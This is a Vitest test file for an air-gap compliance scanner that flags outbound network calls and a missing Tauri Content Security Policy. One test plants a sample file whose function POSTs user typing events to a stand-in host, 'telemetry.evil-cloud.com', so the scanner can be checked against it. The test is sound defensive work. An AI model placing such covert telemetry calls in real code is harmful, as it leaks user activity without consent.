import { describe, it, expect } from 'vitest';
import path from 'path';
import fs from 'fs';
import os from 'os';
// @ts-ignore
import { runAirgapAudit } from './verify-airgap.mjs';

describe('Automated Zero-Telemetry Air-Gap CI Scanner Engine', () => {
  const rootDir = path.resolve(__dirname, '..');

  it('audits the live Vedara repository and asserts 100% air-gap compliance', async () => {
    const auditResult = await runAirgapAudit(rootDir);

    expect(auditResult.status).toBe('PASS');
    expect(auditResult.violationsCount).toBe(0);
    expect(auditResult.totalFilesScanned).toBeGreaterThan(50);
    expect(auditResult.rulesEvaluated).toBe(5);

    // Verify audit report JSON is persisted to disk
    expect(fs.existsSync(auditResult.reportPath)).toBe(true);
    const persistedReport = JSON.parse(fs.readFileSync(auditResult.reportPath, 'utf8'));
    expect(persistedReport.status).toBe('PASS');
    expect(persistedReport.violations).toHaveLength(0);
  });

  it('detects and flags unauthorized external network calls in simulated workspace', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'airgap-test-violation-'));
    try {
      const srcDir = path.join(tempDir, 'src');
      fs.mkdirSync(srcDir, { recursive: true });

      // Create a rogue file with external cloud API calls and tracking
      const rogueCode = `
        export async function sendTelemetry() {
          await fetch('https://telemetry.evil-cloud.com/collect', {
            method: 'POST',
            body: JSON.stringify({ event: 'user_typing' })
          });
        }
      `;
      fs.writeFileSync(path.join(srcDir, 'leakyService.ts'), rogueCode, 'utf8');

      const audit = await runAirgapAudit(tempDir);
      expect(audit.status).toBe('FAIL');
      expect(audit.violationsCount).toBeGreaterThan(0);
      expect(audit.violations.some((v: any) => v.rule === 'NO_EXTERNAL_URLS')).toBe(true);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('respects inline airgap-allow annotations for legitimate documentation references', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'airgap-test-allow-'));
    try {
      const srcDir = path.join(tempDir, 'src');
      fs.mkdirSync(srcDir, { recursive: true });

      // Create a file with an annotated documentation link
      const docCode = `
        // Check https://llvm.org/docs for details // airgap-allow: compiler-documentation-link
        export const COMPILER_VERSION = '18.0';
      `;
      fs.writeFileSync(path.join(srcDir, 'docReference.ts'), docCode, 'utf8');

      const audit = await runAirgapAudit(tempDir);
      expect(audit.status).toBe('PASS');
      expect(audit.violationsCount).toBe(0);
      expect(audit.allowedExceptionsCount).toBe(1);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('detects weak or missing Content Security Policy in tauri.conf.json', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'airgap-test-csp-'));
    try {
      const tauriDir = path.join(tempDir, 'src-tauri');
      fs.mkdirSync(tauriDir, { recursive: true });

      // Missing CSP
      fs.writeFileSync(
        path.join(tauriDir, 'tauri.conf.json'),
        JSON.stringify({ app: { security: {} } }),
        'utf8'
      );

      const audit = await runAirgapAudit(tempDir);
      expect(audit.status).toBe('FAIL');
      expect(audit.violations.some((v: any) => v.rule === 'TAURI_CSP_MISSING')).toBe(true);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });
});
